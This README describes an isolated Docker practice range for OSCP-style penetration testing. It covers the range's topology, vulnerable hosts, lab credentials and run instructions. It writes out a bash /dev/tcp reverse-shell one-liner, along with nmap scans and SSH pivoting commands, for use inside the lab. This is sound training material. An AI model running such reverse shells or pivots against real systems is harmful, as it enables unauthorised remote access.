# Local Docker range (OSCP-shaped Linux)

Offline, resettable practice for **web footholds, Linux privesc, loot reuse, and dual-homed pivoting**. It mirrors the *shape* of the 2026 exam (3 standalones + a 3-host assumed-breach chain), not OffSec’s Windows/AD boxes.

**This does not replace PEN-200, PG Practice, or GOAD.** Those still exist in 2026 — see [practice-labs-2026.md](../../resources/practice-labs-2026.md). Use this range when VPN labs are down, or for 45-minute drills of one technique.

> Bind is `127.0.0.1` plus isolated Docker networks. Attack **only** this compose project on this host.

## Topology

```text
                    [ your attacker (this Linux host) ]
                                    |
                         lab-dmz  172.28.10.0/24
                                    |
          +------------+------------+------------+------------+
          |            |            |            |
       harbor       ledger       catalog        MS01
     172.28.10.11  .10.12       .10.13      .10.21  +  .20.11
     (standalone)  (standalone) (standalone)  (assumed-breach)
                                                     |
                                          lab-internal 172.28.20.0/24
                                          (internal: true — not on the host)
                                                     |
                                              APP01         DC01
                                           172.28.20.12  172.28.20.13
```

| Host | Role | Published | Skills |
|------|------|-----------|--------|
| **harbor** | Standalone A | http://127.0.0.1:8011 | Enum, file upload, cron privesc |
| **ledger** | Standalone B | http://127.0.0.1:8012 · ssh :2212 | LFI → SSH key, sudo GTFOBins |
| **catalog** | Standalone C | http://127.0.0.1:8013 · ssh :2213 | Manual SQLi → SSH → SUID PATH |
| **MS01** | Chain #1 | http://127.0.0.1:8021 · ssh :2221 | **Assumed breach** (creds below), loot, dual-homed |
| **APP01** | Chain #2 | none (internal only) | Credential reuse, config loot |
| **DC01** | Chain #3 | none (internal only) | Final admin analog, `/root/proof.txt` |

On Linux you can usually also scan the DMZ bridge directly:

```bash
nmap -sC -sV 172.28.10.11-13,172.28.10.21
```

`172.28.20.0/24` should **not** answer from the host. If it does, the pivot lesson is gone — check that `lab-internal` is `internal: true`.

## Assumed-breach creds (chain only)

Same idea as the OSCP AD set: you are given a foothold user. You are **not** given APP01/DC01.

```text
host: MS01  (172.28.10.21 or 127.0.0.1:2221)
user: jdoe
pass: Winter2024!
```

## Flags (exam muscle memory)

Every box has:

```bash
# Linux proof discipline
hostname; id; ip a
cat /home/*/local.txt 2>/dev/null
cat /root/proof.txt 2>/dev/null
```

- Standalones: `local.txt` (low-priv) + `proof.txt` (root)
- Chain: `local.txt` on MS01 / APP01 / DC01, `proof.txt` on **DC01** as the “DA” analog

Screenshot hostname + whoami + flag in one frame, then copy into [WRITEUP-TEMPLATE.md](../../09-lab-writeups/WRITEUP-TEMPLATE.md).

## Run

```bash
cd labs/docker
docker compose up -d --build
./isolate-internal.sh    # drop host IP on the internal bridge (pivot required)
./verify-up.sh
```

`isolate-internal.sh` uses a short privileged container so the host cannot cheat onto `172.28.20.0/24`. Re-run it after `compose down`/`up`.

Reset a broken box (or the whole range):

```bash
docker compose restart harbor     # re-applies intended vulns
docker compose down && docker compose up -d
```

Stop:

```bash
docker compose down
```

Disk: one shared Alpine image (php/apache/ssh). Do not pull extra bases if the disk is already tight.

## Rules of the range

- No walkthroughs in this README. Hints → full path: [SPOILERS.md](SPOILERS.md)
- Manual only — treat SQLmap as **banned**, same as exam
- Prefer bash `/dev/tcp` or python reverse shells; listener on your host
- Reverse shell LHOST: use a DMZ IP the container can reach (`ip -br a` on the docker0 / `172.28.10.1` gateway is typical)
- After root: practice the **report paragraph**, not just the flag

## Reverse shell LHOST

Containers route to the host via the DMZ gateway (usually `172.28.10.1`). Example:

```bash
# attacker
nc -lvnp 4444

# on a foothold
bash -c 'bash -i >& /dev/tcp/172.28.10.1/4444 0>&1'
```

If that fails, `ip r` inside the container and listen on that gateway IP.

## Pivot into the chain

From the host, APP01/DC01 are dark. After MS01:

```bash
# option A — ProxyJump
ssh -J jdoe@127.0.0.1:2221 svc_backup@172.28.20.12

# option B — dynamic SOCKS then proxychains
ssh -N -D 1080 -p 2221 jdoe@127.0.0.1
# proxychains nmap 172.28.20.12
```

chisel / ligolo-ng work the same way as in [06-pivoting/tunneling.md](../../06-pivoting/tunneling.md).

## Mapping to the topic tracker

Tick these in [topic-tracker.md](../../09-lab-writeups/topic-tracker.md) when you can do them **without** SPOILERS.md:

- Web: upload, LFI, manual SQLi
- Linux: cron writable script, sudo `find`, SUID PATH hijack
- Shells / transfer
- Dual-homed host + SSH jump / SOCKS
- Proof screenshots

## What you still must practice elsewhere

Windows privesc, WinRM, Kerberos, BloodHound, DCSync, MSSQL, and OffSec “house style” boxes. Use PG Practice, PEN-200 challenge labs (OSCP A/B/C), and GOAD for those.
